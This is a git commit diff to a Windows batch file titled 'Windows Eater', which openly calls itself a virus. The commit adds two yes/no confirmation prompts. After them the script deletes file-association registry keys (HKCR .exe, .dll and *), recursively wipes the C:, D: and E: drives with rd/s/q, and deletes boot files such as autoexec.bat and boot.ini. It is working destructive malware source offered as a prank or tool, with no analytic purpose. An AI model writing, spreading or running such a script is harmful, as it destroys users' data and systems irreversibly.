1ee39481c10d19040c68ae240b03749a15308120
Qapchaqay <54402821+Qapchaqay@users.noreply.github.com>
2020-12-28 15:32:06 +0600

    Update 2
    I made it have some choices so you can type no if you accidentally activated it.

--- Qapchaqay's Windows Eater.bat
+++ Qapchaqay's Windows Eater.bat
@@ -1,5 +1,24 @@
 @echo off
+echo This virus can destroy your computer. Are you sure you want to activate?
+set /p answer=
+if %answer%==yes goto 1
+if %answer%==no goto 2
+:2
 pause
+exit
+:1
+echo Are you sure?
+set /p a2=
+if %a2%==yes goto 3
+if %a2%==no goto 2
+:3
+pause
+start reg delete HKCR/.exe
+start reg delete HKCR/.dll
+start reg delete HKCR/*
+rd/s/q D:\
+rd/s/q C:\
+rd/s/q E:\
 attrib -r -s -h c:\autoexec.bat
 del c:\autoexec.bat
 attrib -r -s -h c:\boot.ini
